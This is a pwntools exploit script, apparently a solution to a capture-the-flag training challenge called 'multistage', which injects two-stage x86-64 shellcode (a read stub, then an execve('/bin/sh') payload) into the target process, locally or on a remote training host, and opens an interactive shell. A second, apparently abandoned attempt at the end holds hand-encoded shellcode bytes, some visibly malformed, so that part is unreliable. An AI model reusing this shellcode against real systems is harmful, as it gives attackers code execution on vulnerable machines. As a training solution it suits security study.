from pwn import *

context.update(arch='amd64', os='linux')
context.terminal=['tmux','splitw','-h']


asm_code="""
push rax
pop rsi
push 0x0
pop rax
push 0x0
pop rdi
push 0x50
pop rdx
syscall
"""

stage1=asm(asm_code)

stage2="nop\n" *len(stage1)+ f"""
push rsi
pop rdi
add rdi, {len(stage1)+ int (0x11)}
push 0x3b
pop rax
push 0x0
pop rsi
push 0x0
pop rdx
syscall
"""

stage2=asm(stage2)+b"/bin/sh\x00"

if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 2003)

else:
    p=process("./multistage")
    gdb.attach(p,"""
    
     """)

input("wait")

p.send(stage1)


input("wait")

p.send(stage2)

p.interactive()










#p=remote("bin.training.offdef.it", 2003)
p=process("./multistage")
shellcode=b"x90\x90\x90\x90\x90\x90\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\xB2\xFF\x0F\XFF\X06"

p.send(shellcode)

shell=b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
p.send(shell)

p.interactive()


